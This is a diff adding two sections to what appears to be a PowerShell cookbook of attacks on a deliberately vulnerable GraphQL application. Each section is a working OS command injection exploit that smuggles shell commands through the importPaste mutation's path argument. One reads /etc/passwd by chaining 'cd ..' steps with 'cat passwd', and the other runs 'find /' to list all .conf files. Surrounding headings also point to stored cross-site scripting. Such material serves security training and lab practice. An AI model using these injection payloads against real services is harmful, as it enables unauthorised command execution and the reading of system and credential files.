@@ -231,6 +231,62 @@ $commandInjectionQuery = '
 Invoke-GraphQLQuery -Query $commandInjectionQuery -Uri $gqlEndpointUri -Raw
 ```
 
+## Code Execution :: OS Command Injection #4
+```powershell
+# Credit Zachary Asher for this one!
+# This is abstracting "cat /etc/passwd via the following:
+# 1. Change directory via "cd" repeatedly to get to the root directory
+# 2. Change director to the etc directory...
+# 3. ...and fininally execute "cat" (concatenate) to read the contents of the passwd file:
+$commandToInject = "cd .. && cd .. && cd .. && cd etc && cat passwd"
+
+$commandInjectionMutation = '
+mutation  {
+      importPaste(host:"localhost", port:80, path:"/ ; ' + $commandToInject + '", scheme:"http"){
+        result
+      }
+    }
+'
+
+$response = $null
+try {
+    $response = Invoke-GraphQLQuery -Mutation $commandInjectionMutation -Uri $gqlEndpointUri -ErrorAction Stop
+    $result = $response.data.importPaste.result
+    Write-Host -Object $result -ForegroundColor Magenta
+}
+catch
+{
+    Write-Host -Object $_.Exception -ForegroundColor Red
+}
+```
+
+## Code Execution :: OS Command Injection #5
+```powershell
+# Find all conf files:
+$commandToInject = "find / -type f -name '*.conf' 2>/dev/null"
+
+$commandInjectionMutation = '
+mutation  {
+      importPaste(host:"localhost", port:80, path:"/ ; ' + $commandToInject + '", scheme:"http"){
+        result
+      }
+    }
+'
+
+$response = $null
+try {
+    $response = Invoke-GraphQLQuery -Mutation $commandInjectionMutation -Uri $gqlEndpointUri -ErrorAction Stop
+    $result = $response.data.importPaste.result
+    Write-Host -Object $result -ForegroundColor Magenta
+}
+catch
+{
+    Write-Host -Object $_.Exception -ForegroundColor Red
+}
+```
+
+
+
 ## Injection :: Stored Cross Site Scripting
 ```powershell
 $xssInjectionMutation = '
